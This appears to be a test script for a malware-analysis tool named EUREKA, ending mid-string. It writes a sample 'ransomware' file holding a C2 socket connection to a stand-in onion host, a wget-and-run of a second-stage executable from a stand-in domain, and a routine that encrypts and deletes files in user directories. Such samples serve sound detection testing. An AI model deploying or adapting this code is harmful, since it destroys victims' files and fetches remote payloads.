"""
EUREKA - Teste Standalone
Demonstra análise completa de malware
"""

from eureka import Eureka
from pathlib import Path

# Criar arquivo de teste com código malicioso
test_file = Path("/tmp/fake_ransomware.py")
test_file.write_text("""
import socket
import os
import subprocess
import base64
from Crypto.Cipher import AES

# Command & Control
C2_SERVER = "evil-c2.darkweb.onion"
C2_PORT = 4444

def connect_c2():
    '''Connect to C2 server'''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_SERVER, C2_PORT))
    return sock

def download_stage2():
    '''Download second stage payload'''
    os.system("wget http://malicious-cdn.com/stage2.exe")
    subprocess.Popen(["chmod", "+x", "stage2.exe"])
    subprocess.Popen(["./stage2.exe"])

def encrypt_user_files():
    '''Ransomware encryption routine'''
    key = os.urandom(32)
    cipher = AES.new(key, AES.MODE_EAX)
    
    target_dirs = ["/home", "/Documents", "/Desktop"]
    
    for directory in target_dirs:
        for root, dirs, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted = cipher.encrypt(data)
                    with open(filepath + '.locked', 'wb') as f:
                        f.write(encrypted)
                    os.remove(filepath)
                except:
                    pass

def display_ransom_note():
    note = base64.b64decode("WW91ciBmaWxlcyBoYXZlIGJlZW